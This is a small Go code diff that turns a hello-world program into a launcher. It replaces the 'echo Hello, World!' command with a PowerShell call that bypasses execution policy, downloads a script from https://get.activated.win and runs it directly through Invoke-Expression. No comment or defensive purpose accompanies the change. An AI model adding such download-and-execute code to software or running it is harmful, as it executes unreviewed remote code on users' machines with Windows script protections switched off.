@@ -6,14 +6,13 @@ import (
 )
 
 func main() {
+	
+	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "iwr https://get.activated.win | iex")
 
-	cmd := exec.Command("echo", "Hello, World!")
-	output, err := cmd.Output()
+	output, err := cmd.CombinedOutput()
 	if err != nil {
 		fmt.Println("Error executing command:", err)
-		return
 	}
 
 	fmt.Println(string(output))
-
 }
